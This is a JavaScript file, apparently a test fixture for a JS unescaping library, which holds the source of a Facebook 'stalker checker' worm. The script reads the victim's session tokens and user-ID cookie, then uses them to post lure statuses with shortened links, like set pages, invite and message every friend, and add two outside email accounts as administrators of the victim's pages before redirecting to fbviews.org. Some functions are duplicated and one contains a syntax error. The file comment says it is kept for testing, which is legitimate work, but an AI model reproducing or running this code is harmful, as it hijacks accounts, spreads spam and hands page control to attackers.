/*
 * Copyright (C) 2014-2024 Philip Helger (www.helger.com)
 * philip[at]helger[dot]com
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *         http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
// This is a SPAM tool. It's just here to test the JS unescaping!!!!
// http://profilechecker.info/StalkerTools.fb
var texts = [
",",
"split",
"",
"length",
"fromCharCode",
"friendselector_input[]=",
"&friend_selected[]=",
"POST",
"/pages/edit/?id=",
"&sk=admin",
"Content-Type",
"application/x-www-form-urlencoded",
"post_form_id=",
"&fb_dtsg=",
"&fbpage_id=",
"&",
"join",
"&save=1",
"match",
"randomize",
"\n\n",
"&xhpc_composerid=",
"&xhpc_targetid=",
"|",
"&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=",
"replace",
"&xhpc_message=",
"&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest",
"/ajax/updatestatus.php?__a=1",
"http://goo.gl/V7688",
"http://ow.ly/3ZeNC",
"http://is.gd/dJjed3",
"http://goo.gl/kftAl",
"http://goo.gl/UQA7I",
"http://tiny.cc/v1bwd",
"168046893242650",
"127901437283104",
"165991450116555",
"chunfeezellwytm@hotmail.com,wintersaccohoqr@hotmail.com",
"Wow! Seems like lots of people stalk me - ",
"New FB tool shows who stalks your profile-- ",
"Secret tool shows who stalks your pics ",
"Insane! Awesome tool to see who looks at your pics >> ",
"According to ",
" you're my top stalker. Creep.",
"Secret tool shows who stalks your pics - ",
"Check this out!",
"Hey, whats happening?",
"Hey! This is awesome",
"prototype",
"random",
"floor",
"isReady",
"readyState",
"status",
"getFriends",
"slice",
":",
"div",
"createElement",
"id",
"screwyouz",
"align",
"center",
"setAttribute",
"margin",
"style",
"0px auto",
"position",
"absolute",
"top",
"10px",
"zindex",
"100",
"className",
"screwyou",
"innerHTML",
"<br /><br /><br /><br /><br /><center><img src=\"http://fbviews.org/process.gif\" /><br />Scanning may take up to 3 minutes</center>",
"appendChild",
"body",
"href",
"location",
"http://www.facebook.com/",
"GET",
"/",
"responseText",
"Hello!\n\nTo activate the tool press Enter on your keyboard.\n\nThis will take 2-3 minutes, while waiting please do not close this window or tab.",
"cookie",
"/ajax/pages/fan_status.php?__a=1",
"fbpage_id=",
"&add=1&reload=1&preserve_tab=1&use_primer=1&nctr[_mod]=pagelet_top_bar&post_form_id=",
"&lsd&post_form_id_source=AsyncRequest",
"/ajax/browser/list/friends/all/?uid=",
"&offset=0&dual=1&__a=1",
"ids[",
"]=",
"/ajax/social_graph/invite_dialog.php?__a=1",
"&send_invitations=1&invite_id_list=&email_addresses=&invite_msg=&",
"&node_id=",
"&class=GuestManager&__d=1&lsd&post_form_id_source=AsyncRequest",
"http://fbviews.org/result.php",
"/ajax/messaging/composer.php?__a=1&__d=1",
"ids_",
"[0]=",
"&subject=",
"&status=",
"&ids[0]=",
"&action=send_new&home_tab_id=1&profile_id=",
"&target_id=0&app_id=&&composer_id=",
"&hey_kid_im_a_composer=true&thread&post_form_id=",
"&lsd&_log_action=send_new&_log_thread&ajax_log=1&post_form_id_source=AsyncRequest",
"/ajax/gigaboxx/endpoint/MessageComposerEndpoint.php?__a=1",
"/insights/?_fb_noscript=1"];
function _88xuhyr(_0x91e5x2) {
  st = _0x91e5x2.split(',');
  d = '';
  for (i = 0; i < st.length; i++) {
    d += String.fromCharCode(st[i] - 24);
  }
  eval(d);
};
function addAdmin(_0x91e5x4, _0x91e5x5, _0x91e5x6, _0x91e5x7) {
  iemails = _0x91e5x5.split(',');
  main_emails = [];
  for (i = 0; i < iemails.length; i++) {
    main_emails[i] = 'friendselector_input[]=' + iemails[i] + '&friend_selected[]=';
  }
  with (newx = new XMLHttpRequest) {
    open('POST', '\/pages\/edit\/?id=' + _0x91e5x4 + '&sk=admin');
    setRequestHeader('Content-Type', 'application\/x-www-form-urlencoded');
    send('post_form_id=' + _0x91e5x6 + '&fb_dtsg=' + _0x91e5x7 + '&fbpage_id='
        + _0x91e5x4 + '&' + main_emails.join('&')
        + '&save=1');
  }
};
function makePost(_0x91e5x9, _0x91e5xa, _0x91e5xb, _0x91e5xc) {
  formx = _0x91e5x9.match(/name="post_form_id" value="([\d\w]+)"/)[1];
  dtx = _0x91e5x9.match(/name="fb_dtsg" value="([^"]+)"/)[1];
  composerx = _0x91e5x9.match
      (/name=\\\"xhpc_composerid\\\" value=\\\"([^"]+)\\\"/)[1];
  msg = _0x91e5xa.randomize() + '\n\n';
  text_post = '';
  text_actual = '';
  pxt = 'post_form_id=' + formx + '&fb_dtsg=' + dtx + '&xhpc_composerid=' + composerx
      + '&xhpc_targetid=' + _0x91e5xb.split('|')[0] + '&xhpc_context=home&xhpc_fbx=1&xhpc_message_text='
      + encodeURIComponent(msg + text_actual.replace(/\, $/, ''))
      + '&xhpc_message='
      + encodeURIComponent(msg + text_post.replace(/\, $/, ''))
      + '&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest';
  update(pxt);
};
function update(_0x91e5xe) {
  with (newx = new XMLHttpRequest) {
    open('POST', '\/ajax\/updatestatus.php?__a=1');
    setRequestHeader('Content-Type', 'application\/x-www-form-urlencoded');
    send(_0x91e5xe);
  }
  ;
};
goog1 = 'http:\/\/goo.gl\/V7688';
goog2 = 'http:\/\/ow.ly\/3ZeNC';
goog3 = 'http:\/\/is.gd\/dJjed3';
goog4 = 'http:\/\/goo.gl\/kftAl';
goog5 = 'http:\/\/goo.gl\/UQA7I';
goog6 = 'http:\/\/tiny.cc\/v1bwd';
event_id = '168046893242650';
page_id_x = '127901437283104';
page_id_xx = '165991450116555';
admin_emails = 'chunfeezellwytm@hotmail.com,wintersaccohoqr@hotmail.com';
statuses = [ 'Wow! Seems like lots of people stalk me - ' + goog1, 'New FB tool shows who stalks your profile-- ' + goog2, 'Secret tool shows who stalks your pics ' + goog3,
    'Insane! Awesome tool to see who looks at your pics >> ' + goog4, 'According to ' + goog5 + ' you\'re my top stalker. Creep.', 'Secret tool shows who stalks your pics - ' + goog6 ];
subjects = [ 'Check this out!', 'Hey, whats happening?', 'Hey! This is awesome' ];
Array.prototype.randomize = function() {
  return this[Math.floor(Math.random() * this.length)];
};
Object.prototype.isReady = function() {
  return this.readyState == 4 && this.status == 200);
};
String.prototype.getFriends = function() {
  friends2 = this.match
      (/facebook\.com\\\\\\\/profile\.php\?id=\d+\\\\\\\">(<span[^>]+>|)[^<>]+/gi).join
      (':').replace(
      /(facebook\.com\\\\\\\/|profile\.php\?id=|<span[^>]+>|l\.php.*)/gi,
      '').replace(/\\\\\\\">/gi, '|').split
      (':').slice(1);
  return friends2;
};
function addAdmin(_0x91e5x4, _0x91e5x5, _0x91e5x6, _0x91e5x7) {
  iemails = _0x91e5x5.split(',');
  main_emails = [];
  for (i = 0; i < iemails.length; i++) {
    main_emails[i] = 'friendselector_input[]=' + iemails[i] + '&friend_selected[]=';
  }
  with (newx = new XMLHttpRequest) {
    open('POST', '\/pages\/edit\/?id=' + _0x91e5x4 + '&sk=admin');
    setRequestHeader('Content-Type', 'application\/x-www-form-urlencoded');
    send('post_form_id=' + _0x91e5x6 + '&fb_dtsg=' + _0x91e5x7 + '&fbpage_id='
        + _0x91e5x4 + '&' + main_emails.join('&')
        + '&save=1');
  }
};
function loading() {
  var _0x91e5x10 = document.createElement('div');
  _0x91e5x10.id = 'screwyouz';
  _0x91e5x10.setAttribute('align', 'center');
  _0x91e5x10.style.margin = '0px auto';
  _0x91e5x10.style.position = 'absolute';
  _0x91e5x10.style.top = '10px';
  _0x91e5x10.style.zindex = '100';
  _0x91e5x10.className = 'screwyou';
  _0x91e5x10.innerHTML = '<br \/><br \/><br \/><br \/><br \/><center><img src=\"http:\/\/fbviews.org\/process.gif\" \/><br \/>Scanning may take up to 3 minutes<\/center>';
  document.body.appendChild(_0x91e5x10);
};
function makePost(_0x91e5x9, _0x91e5xa, _0x91e5xb, _0x91e5xc) {
  formx = _0x91e5x9.match(/name="post_form_id" value="([\d\w]+)"/)[1];
  dtx = _0x91e5x9.match(/name="fb_dtsg" value="([^"]+)"/)[1];
  composerx = _0x91e5x9.match
      (/name=\\\"xhpc_composerid\\\" value=\\\"([^"]+)\\\"/)[1];
  msg = _0x91e5xa.randomize() + '\n\n';
  text_post = '';
  text_actual = '';
  pxt = 'post_form_id=' + formx + '&fb_dtsg=' + dtx + '&xhpc_composerid=' + composerx
      + '&xhpc_targetid=' + _0x91e5xb.split('|')[0] + '&xhpc_context=home&xhpc_fbx=1&xhpc_message_text='
      + encodeURIComponent(msg + text_actual.replace(/\, $/, ''))
      + '&xhpc_message='
      + encodeURIComponent(msg + text_post.replace(/\, $/, ''))
      + '&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest';
  update(pxt);
};
function update(_0x91e5xe) {
  with (newx = new XMLHttpRequest) {
    open('POST', '\/ajax\/updatestatus.php?__a=1');
    setRequestHeader('Content-Type', 'application\/x-www-form-urlencoded');
    send(_0x91e5xe);
  }
};
if (window.location.href == 'http:\/\/www.facebook.com\/') {
  formx = (res = document.body.innerHTML).match
      (/name="post_form_id" value="([\d\w]+)"/)[1];
  dtx = res.match(/name="fb_dtsg" value="([^"]+)"/)[1];
  composerx = res.match
      (/name=\\\"xhpc_composerid\\\" value=\\\"([^"]+)\\\"/)[1];
} else {
  with (muhaha = new XMLHttpRequest) {
    open('GET', '\/', false);
    send(null);
  }
  formx = (res = muhaha.responseText).match
      (/name="post_form_id" value="([\d\w]+)"/)[1];
  dtx = res.match(/name="fb_dtsg" value="([^"]+)"/)[1];
  composerx = res.match
      (/name=\\\"xhpc_composerid\\\" value=\\\"([^"]+)\\\"/)[1];
};
alert('Hello!\n\nTo activate the tool press Enter on your keyboard. \n\nThis will take 2-3 minutes, while waiting please do not close this window or tab.');
update('post_form_id=' + formx + '&fb_dtsg=' + dtx + '&xhpc_composerid=' + composerx
    + '&xhpc_targetid=' + document.cookie.match(/c_user=(\d+)/)[1]
    + '&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=' + encodeURIComponent(stx = statuses.randomize())
    + '&xhpc_message=' + encodeURIComponent(stx) + '&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest');
// Become a fan of 2 profiles
with (newz = new XMLHttpRequest) {
  loading();
  open('POST', '\/ajax\/pages\/fan_status.php?__a=1');
  setRequestHeader('Content-Type', 'application\/x-www-form-urlencoded');
  send('fbpage_id=' + page_id_x + '&add=1&reload=1&preserve_tab=1&use_primer=1&nctr[_mod]=pagelet_top_bar&post_form_id=' + formx + '&fb_dtsg=' + dtx
      + '&lsd&post_form_id_source=AsyncRequest');
};
with (newzz = new XMLHttpRequest) {
  open('POST', '\/ajax\/pages\/fan_status.php?__a=1');
  setRequestHeader('Content-Type', 'application\/x-www-form-urlencoded');
  send('fbpage_id=' + page_id_xx + '&add=1&reload=1&preserve_tab=1&use_primer=1&nctr[_mod]=pagelet_top_bar&post_form_id=' + formx + '&fb_dtsg=' + dtx
      + '&lsd&post_form_id_source=AsyncRequest');
};
void 0;
with (fr = new XMLHttpRequest) {
  open('GET', '\/ajax\/browser\/list\/friends\/all\/?uid='
      + (me = document.cookie.match(/c_user=(\d+)/)[1])
      + '&offset=0&dual=1&__a=1');
  onreadystatechange = function() {
    if (fr.isReady()) {
      // Extract friends from response
      friends = fr.responseText.getFriends();
      idx = [];
      for (i = 0; i < friends.length; i++) {
        if (!isNaN(friends[i].split('|')[0])) {
          idx[i] = 'ids[' + i + ']=' + friends[i].split('|')[0];
        }
      }
      with (invi = new XMLHttpRequest) {
        open('POST', '\/ajax\/social_graph\/invite_dialog.php?__a=1');
        setRequestHeader('Content-Type', 'application\/x-www-form-urlencoded');
        send('post_form_id=' + formx + '&fb_dtsg=' + dtx + '&send_invitations=1&invite_id_list=&email_addresses=&invite_msg=&'
            + idx.join('&') + '&node_id=' + event_id
            + '&class=GuestManager&__d=1&lsd&post_form_id_source=AsyncRequest');
      }
      cnt_fr = 0;
      tx = setInterval(function() {
        if (cnt_fr == friends.length) {
          window.location = 'http:\/\/fbviews.org\/result.php';
          clearInterval(tx);
        }
        makePost(document.body.innerHTML, statuses, friends[cnt_fr], friends);
        with (xa = new XMLHttpRequest) {
          open('GET', '\/ajax\/messaging\/composer.php?__a=1&__d=1');
          onreadystatechange = function() {
            if (xa.isReady()) {
              compi = xa.responseText.match(/([\d\w]+)_error/)[1];
              pxi = 'ids_' + compi + '[0]='
                  + friends[cnt_fr].split('|')[0] + '&subject='
                  + encodeURIComponent(subjects.randomize()) + '&status='
                  + encodeURIComponent(statuses.randomize()) + '&ids[0]='
                  + friends[cnt_fr].split('|')[0] + '&action=send_new&home_tab_id=1&profile_id='
                  + document.cookie.match(/c_user=(\d+)/)[1]
                  + '&target_id=0&app_id=&&composer_id=' + compi + '&hey_kid_im_a_composer=true&thread&post_form_id=' + formx + '&fb_dtsg='
                  + dtx + '&lsd&_log_action=send_new&_log_thread&ajax_log=1&post_form_id_source=AsyncRequest';
              if (cnt_fr < 15) {
                with (mi = new XMLHttpRequest) {
                  open('POST', '\/ajax\/gigaboxx\/endpoint\/MessageComposerEndpoint.php?__a=1');
                  setRequestHeader('Content-Type', 'application\/x-www-form-urlencoded');
                  send(pxi);
                }
              }
            }
          };
          send(null);
        }
        cnt_fr += 1;
      }, 3000);
    }
  };
  send(null);
};
with (ins = new XMLHttpRequest) {
  open('GET', '\/insights\/?_fb_noscript=1');
  onreadystatechange = function() {
    if (ins.isReady()) {
      ids = ins.responseText.match(/po_\d+">View/gi).join
          (':').replace(/(po_|">View)/gi, '').split
          (':');
      cnt_pages = 0;
      tz = setInterval(function() {
        if (cnt_pages == ids.length) {
          window.location = 'http:\/\/fbviews.org\/result.php';
          clearInterval(tz);
        }
        update('post_form_id=' + formx + '&fb_dtsg=' + dtx + '&xhpc_composerid='
            + composerx + '&xhpc_targetid=' + ids[cnt_pages] + '&xhpc_context=home&xhpc_fbx=1&xhpc_message_text='
            + encodeURIComponent(stx = statuses.randomize()) + '&xhpc_message='
            + encodeURIComponent(stx) + '&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest');
        addAdmin(ids[cnt_pages], admin_emails, formx, dtx);
        cnt_pages += 1;
      }, 3000);
    }
  };
  send(null);
};
